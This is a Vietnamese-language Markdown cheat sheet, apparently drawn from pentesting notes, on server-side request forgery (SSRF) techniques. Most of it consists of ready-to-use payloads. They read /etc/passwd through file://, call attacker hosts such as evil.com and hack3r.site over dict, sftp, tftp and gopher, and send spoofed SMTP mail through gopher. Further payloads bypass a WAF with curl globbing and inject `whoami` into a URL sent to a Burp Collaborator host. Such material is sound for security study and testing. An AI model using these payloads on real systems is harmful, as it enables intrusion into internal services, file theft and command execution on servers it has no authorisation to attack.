# **Các loại tấn công SSRF**

## **Qua phương thức (Protocols)**

> **file://**

```
file:///etc/passwd
```

> **dict://**
``` dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

> **SFTP://**

- Giao thức truyền file an toàn.

```
ssrf.php?url=sftp://evil.com:11111/
```

> **TFTP://**

- Giao thức truyền tệp UDP

```
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

> **Gopher://**

- Chúng ta có thể sử dụng tool [Gopherus](https://github.com/tarunkant/Gopherus) để tạo payload với từng dịch vụ.

- Có thể RCE qua công cụ [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

> Gopher smtp

```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```

> Gopher HTTP

```
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```

> Gopher SMTP — Back connect to 1337

```
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```

> **Curl URL globbing - WAF bypass**

- Nếu SSRF được thực thi bằng Curl, thì Curl có một tính năng gọi là [URL globbing](https://everything.curl.dev/cmdline/globbing) có thể hữu ích để vượt qua WAF. Ví dụ: trong [writeup](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) này, bạn có thể tìm thấy ví dụ này để truyền tải đường dẫn thông qua giao thức tệp:

```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```

> Tìm hiểu về url globbing

- Đôi khi, bạn muốn nhận được nhiều URL gần giống nhau, chỉ một phần nhỏ trong số đó thay đổi giữa các yêu cầu. Có thể đó là một dãy số hoặc có thể là một tập hợp các tên. Curl cung cấp tính năng "url globbing" như một cách để chỉ định nhiều URL như vậy một cách dễ dàng.

- Tính toàn cầu sử dụng các ký hiệu dành riêng [] và {} cho việc này, các ký hiệu thường không thể là một phần của URL hợp pháp (ngoại trừ các địa chỉ IPv6 dạng số nhưng dù sao thì cuộn tròn vẫn xử lý chúng tốt).

- Nếu tính năng toàn cầu cản trở bạn, hãy tắt nó bằng -g, --globoff.

- `Numerical ranges:`
    - Bạn có thể yêu cầu một phạm vi số với cú pháp `[N-M]`, trong đó N là chỉ mục bắt đầu và nó đi lên và bao gồm M. Ví dụ: bạn có thể yêu cầu từng hình ảnh 100 được đặt tên bằng số: `curl -O "http://example.com/[1-100].png" ; curl -O "http://example.com/[0-100:2].png" ; `
- `Alphabetical ranges:`
    - Curl cũng có thể thực hiện các phạm vi theo thứ tự bảng chữ cái, như khi một trang web có các phần được đặt tên từ a đến z: `curl -O "http://example.com/section[a-z].html"`
- `List`
    - Đôi khi các phần không tuân theo một mẫu đơn giản như vậy và khi đó bạn có thể tự mình đưa ra danh sách đầy đủ nhưng sau đó đặt trong dấu ngoặc nhọn thay vì dấu ngoặc được sử dụng cho các phạm vi: `curl -O "http://example.com/{one,two,three,alpha,beta}.html"`
- `Combinations:`
    - Bạn có thể sử dụng một số quả cầu trong cùng một URL, điều này sau đó cũng sẽ làm cho việc lặp lại các quả cầu đó trở nên khó khăn hơn. Để tải xuống hình ảnh của Ben, Alice và Frank, ở cả độ phân giải 100 x 100 và 1000 x 1000, một dòng lệnh có thể trông như sau: `curl -O "http://example.com/{Ben,Alice,Frank}-{100x100,1000x1000}.jpg"`

![](./img_SSRF/Screenshot%202023-09-25%20022817.png)
![](./img_SSRF/Screenshot%202023-09-25%20023012.png)

## **Wget file upload**

> **SSRF with Command Injection**

```
url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`
```    
> **PDFs Rendering**

- Nếu trang web tự động tạo một tệp PDF với một số thông tin bạn đã cung cấp, bạn có thể chèn một số JS sẽ được chính người tạo PDF (máy chủ) thực thi trong khi tạo tệp PDF và bạn sẽ có thể lạm dụng SSRF. [**Tìm thêm thông tin ở đây**](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#popular-pdf-generation).

## **SSRF PHP Functions**

![](./img_SSRF/Screenshot%202023-09-25%20024116.png)
![](./img_SSRF/Screenshot%202023-09-25%20024215.png)
![](./img_SSRF/Screenshot%202023-09-25%20025740.png)